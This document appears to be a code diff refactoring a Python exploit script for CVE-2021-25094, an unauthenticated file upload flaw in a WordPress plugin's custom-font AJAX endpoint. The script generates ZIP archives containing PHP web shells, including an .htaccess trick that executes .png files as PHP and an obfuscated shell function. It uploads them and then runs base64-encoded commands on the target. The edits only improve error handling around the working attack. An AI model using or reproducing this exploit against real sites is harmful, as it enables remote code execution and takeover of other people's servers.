@@ -2,7 +2,6 @@
 # See the file 'LICENSE' for copying permission.
 # CVE-2021-25094
 
-import sys
 import requests
 import urllib3
 import io
@@ -12,13 +11,11 @@ import random
 import base64
 from platform import python_version
 from colorama import init, Fore, Style
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=True)
 
 def generate_zip(compression_level=9, technique="php", keep=False):
-
     print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Generating ZIP file with shell technique '{technique}'")
 
     buffer = io.BytesIO()
@@ -42,7 +39,7 @@ def generate_zip(compression_level=9, technique="php", keep=False):
 
     elif technique.startswith("htaccess"):
         shell = "AddType application/x-httpd-php .png\n"
-        zip_file.writestr(".htaccess", shell)                
+        zip_file.writestr(".htaccess", shell)                 
 
         shell = "<?php "
         shell += "$f = \"lmeyst\";"
@@ -58,14 +55,13 @@ def generate_zip(compression_level=9, technique="php", keep=False):
 
     else:
         print(f"{Style.BRIGHT}{Fore.RED}[!] Error: Unknown shell technique '{technique}'")
-        sys.exit(1)
+        return None, None, None  # Indicate failure
 
     zipname = ''.join(random.choice(string.ascii_lowercase) for i in range(3))            
     return buffer, zipname, shell_filename
 
 
 def upload_zip(profile_url, zip_file, zipname):
-
     print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Uploading ZIP archive to {profile_url}/wp-admin/admin-ajax.php?action=add_custom_font")
     url = f"{profile_url}/wp-admin/admin-ajax.php?action=add_custom_font"
     files = {"file": (f"{zipname}.zip", zip_file.getvalue())}
@@ -90,7 +86,6 @@ def upload_zip(profile_url, zip_file, zipname):
 
 
 def trigger_shell(profile_url, zipname, shell_filename, cmd):
-
     shell_url = f"{profile_url}/wp-content/uploads/typehub/custom/{zipname}/{shell_filename}"
     encoded_cmd = base64.b64encode(cmd.encode("utf8")).decode("utf8")
     
@@ -114,9 +109,15 @@ def scan_cve_2021_25094(profile_url):
         print(f"{Style.BRIGHT}{Fore.CYAN}[•] Attempting exploitation using technique: {technique}")
         zip_file, zipname, shell_filename = generate_zip(technique=technique)
 
+        if zip_file is None or zipname is None or shell_filename is None:
+            print(f"{Style.BRIGHT}{Fore.RED}[!] Exploitation failed due to ZIP generation error with technique: {technique}")
+            continue  # Skip to the next technique
+
         if upload_zip(profile_url, zip_file, zipname):
             if trigger_shell(profile_url, zipname, shell_filename, cmd):
                 print(f"{Style.BRIGHT}{Fore.GREEN}[+] Exploitation successful using technique: {technique}")
-                break 
+                return True  # Exit on success
         else:
             print(f"{Style.BRIGHT}{Fore.RED}[!] Exploitation failed using technique: {technique}")
+
+    return False  # Indicate overall failure
